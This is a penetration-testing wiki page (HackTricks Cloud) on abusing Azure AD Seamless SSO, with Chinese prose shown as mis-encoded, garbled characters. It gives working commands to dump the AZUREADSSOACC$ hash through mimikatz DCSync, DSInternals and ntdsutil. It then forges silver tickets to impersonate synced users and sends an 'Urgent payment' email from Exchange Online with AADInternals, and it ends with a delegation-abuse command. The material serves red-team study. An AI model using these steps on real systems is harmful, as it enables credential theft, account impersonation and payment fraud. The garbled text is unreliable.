# Az - Seamless SSO

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

[æ¥è‡ªæ–‡æ¡£:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO) è‡ªåŠ¨**åœ¨ç”¨æˆ·ä½¿ç”¨å…¬å¸è®¾å¤‡è¿æ¥åˆ°å…¬å¸ç½‘ç»œæ—¶ç™»å½•**ã€‚å¯ç”¨åï¼Œ**ç”¨æˆ·æ— éœ€è¾“å…¥å¯†ç å³å¯ç™»å½• Azure AD**ï¼Œé€šå¸¸ç”šè‡³æ— éœ€è¾“å…¥ç”¨æˆ·åã€‚æ­¤åŠŸèƒ½ä¸ºç”¨æˆ·æä¾›äº†è½»æ¾è®¿é—®åŸºäºäº‘çš„åº”ç”¨ç¨‹åºçš„é€”å¾„ï¼Œæ— éœ€ä»»ä½•é¢å¤–çš„æœ¬åœ°ç»„ä»¶ã€‚

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬ä¸Šï¼ŒAzure AD Seamless SSO **åœ¨ç”¨æˆ·ä½¿ç”¨åŠ å…¥æœ¬åœ°åŸŸçš„ PC æ—¶è‡ªåŠ¨ç™»å½•**ã€‚

å®ƒåŒæ—¶æ”¯æŒ [**PHS (Password Hash Sync)**](phs-password-hash-sync.md) å’Œ [**PTA (Pass-through Authentication)**](pta-pass-through-authentication.md)ã€‚

æ¡Œé¢ SSO ä½¿ç”¨ **Kerberos** è¿›è¡Œèº«ä»½éªŒè¯ã€‚é…ç½®æ—¶ï¼ŒAzure AD Connect ä¼šåœ¨æœ¬åœ° AD ä¸­åˆ›å»ºä¸€ä¸ªåä¸º **AZUREADSSOACC`$`** çš„è®¡ç®—æœºè´¦æˆ·ã€‚`AZUREADSSOACC$` è´¦æˆ·çš„å¯†ç åœ¨é…ç½®æœŸé—´**ä»¥æ˜æ–‡å½¢å¼å‘é€åˆ° Azure AD**ã€‚

**Kerberos ç¥¨æ®**ä½¿ç”¨å¯†ç çš„ **NTHash (MD4)** è¿›è¡Œ**åŠ å¯†**ï¼ŒAzure AD ä½¿ç”¨å‘é€çš„å¯†ç è§£å¯†ç¥¨æ®ã€‚

**Azure AD** æš´éœ²äº†ä¸€ä¸ª**ç«¯ç‚¹** (https://autologon.microsoftazuread-sso.com) æ¥å— Kerberos **ç¥¨æ®**ã€‚åŸŸåŠ å…¥æœºå™¨çš„æµè§ˆå™¨å°†ç¥¨æ®è½¬å‘åˆ°æ­¤ç«¯ç‚¹ä»¥è¿›è¡Œ SSOã€‚

### æœ¬åœ° -> äº‘

ç”¨æˆ· **`AZUREADSSOACC$` çš„å¯†ç æ°¸è¿œä¸ä¼šæ”¹å˜**ã€‚å› æ­¤ï¼ŒåŸŸç®¡ç†å‘˜å¯ä»¥ç ´åæ­¤è´¦æˆ·çš„**å“ˆå¸Œ**ï¼Œç„¶åä½¿ç”¨å®ƒ**åˆ›å»ºé“¶ç¥¨**ï¼Œä»¥**ä»»ä½•åŒæ­¥çš„æœ¬åœ°ç”¨æˆ·**è¿æ¥åˆ° Azure:
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifmâ€ "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
æœ‰äº†å“ˆå¸Œå€¼ï¼Œä½ ç°åœ¨å¯ä»¥**ç”Ÿæˆé“¶ç¥¨**ï¼š
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
è¦ä½¿ç”¨é“¶ç¥¨ï¼Œéœ€æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š

1. **å¯åŠ¨æµè§ˆå™¨ï¼š** å¯åŠ¨ Mozilla Firefoxã€‚
2. **é…ç½®æµè§ˆå™¨ï¼š**
* è¿›å…¥ **`about:config`**ã€‚
* å°† [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) çš„åå¥½è®¾ç½®ä¸ºæŒ‡å®šçš„ [å€¼](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically)ï¼š
* `https://aadg.windows.net.nsatc.net`
* `https://autologon.microsoftazuread-sso.com`
3. **è®¿é—® Web åº”ç”¨ç¨‹åºï¼š**
* è®¿é—®ä¸ç»„ç»‡çš„ AAD åŸŸé›†æˆçš„ Web åº”ç”¨ç¨‹åºã€‚ä¸€ä¸ªå¸¸è§çš„ä¾‹å­æ˜¯ [Office 365](https://portal.office.com/)ã€‚
4. **è®¤è¯è¿‡ç¨‹ï¼š**
* åœ¨ç™»å½•å±å¹•ä¸Šï¼Œè¾“å…¥ç”¨æˆ·åï¼Œå¯†ç å­—æ®µç•™ç©ºã€‚
* æŒ‰ TAB æˆ– ENTER ç»§ç»­ã€‚

{% hint style="success" %}
è¿™ä¸ä¼šç»•è¿‡å·²å¯ç”¨çš„ MFA
{% endhint %}

#### ~~ä¸ºä»…äº‘ç”¨æˆ·åˆ›å»º Kerberos ç¥¨æ®~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

å¦‚æœ Active Directory ç®¡ç†å‘˜æœ‰æƒè®¿é—® Azure AD Connectï¼Œä»–ä»¬å¯ä»¥ **ä¸ºä»»ä½•äº‘ç”¨æˆ·è®¾ç½® SID**ã€‚è¿™æ · Kerberos **ç¥¨æ®**ä¹Ÿå¯ä»¥ **ä¸ºä»…äº‘ç”¨æˆ·åˆ›å»º**ã€‚å”¯ä¸€çš„è¦æ±‚æ˜¯ SID æ˜¯ä¸€ä¸ªåˆé€‚çš„ [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\))ã€‚

{% hint style="danger" %}
æ›´æ”¹ä»…äº‘ç®¡ç†å‘˜ç”¨æˆ·çš„ SID ç°åœ¨å·²è¢« **Microsoft é˜»æ­¢**ã€‚\
è¯¦æƒ…è¯·æŸ¥çœ‹ [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
{% endhint %}

### On-prem -> Cloud via Resource Based Constrained Delegation <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

ä»»ä½•å¯ä»¥ç®¡ç†å®¹å™¨æˆ– OU ä¸­è®¡ç®—æœºå¸æˆ· (`AZUREADSSOACC$`) çš„äººï¼Œéƒ½å¯ä»¥ **é…ç½®åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾å¹¶è®¿é—®è¯¥å¸æˆ·**ã€‚
```python
python rbdel.py -u <workgroup>\\<user> -p <pass> <ip> azureadssosvc$
```
## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: æˆ‘åœ¨ä½ çš„äº‘ä¸­ï¼Œé˜…è¯»æ¯ä¸ªäººçš„é‚®ä»¶ - é€šè¿‡Active Directoryæ”»å‡»Azure AD](https://www.youtube.com/watch?v=JEIR5oGCwdg)

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹ GCP Hackingï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“ã€‚

</details>
{% endhint %}
